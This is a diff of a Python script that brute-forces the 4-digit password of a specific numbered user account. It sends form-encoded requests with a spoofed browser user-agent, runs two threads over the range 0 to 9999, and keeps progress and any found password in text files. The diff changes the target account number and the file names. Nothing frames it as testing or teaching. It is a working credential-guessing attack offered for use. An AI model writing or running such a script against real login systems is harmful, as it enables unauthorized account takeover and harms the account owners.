@@ -5,16 +5,16 @@ header = {
     "content-type":"application/x-www-form-urlencoded",
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
 }
-username = 161080
+username = 161010
 def getRun():
-    df = open('password_v2.txt', 'r', encoding='utf-8')
+    df = open('password_v2_status.txt', 'r', encoding='utf-8')
     return df.read()
 def setRun(x):
-    df = open('password_v2.txt', 'w',encoding='utf-8')
+    df = open('password_v2_status.txt', 'w',encoding='utf-8')
     df.writelines(str(x))
     df.close()
 def result(x):
-    df = open('password.txt', 'w',encoding='utf-8')
+    df = open('password_v2_result.txt', 'w',encoding='utf-8')
     df.writelines(str(x))
     df.close()
 def BrutforcePassword(start,end,length):
@@ -45,16 +45,5 @@ def BrutforcePassword(start,end,length):
         except:
             pass
 setRun("1")
-# threading.Thread(target=BrutforcePassword,args=(0,1000,4,)).start()
-# threading.Thread(target=BrutforcePassword,args=(1000,2000,4,)).start()
-# threading.Thread(target=BrutforcePassword,args=(2000,3000,4,)).start()
-# threading.Thread(target=BrutforcePassword,args=(3000,4000,4,)).start()
-# threading.Thread(target=BrutforcePassword,args=(4000,5000,4,)).start()
-# threading.Thread(target=BrutforcePassword,args=(5000,6000,4,)).start()
-# threading.Thread(target=BrutforcePassword,args=(6000,7000,4,)).start()
-# threading.Thread(target=BrutforcePassword,args=(7000,8000,4,)).start()
-# threading.Thread(target=BrutforcePassword,args=(8000,9000,4,)).start()
-# threading.Thread(target=BrutforcePassword,args=(9000,10000,4,)).start()
-
-BrutforcePassword(0,5000,4)
-BrutforcePassword(5000,10000,4)
+threading.Thread(target=BrutforcePassword,args=(0,5000,4,)).start()
+threading.Thread(target=BrutforcePassword,args=(5000,10000,4,)).start()
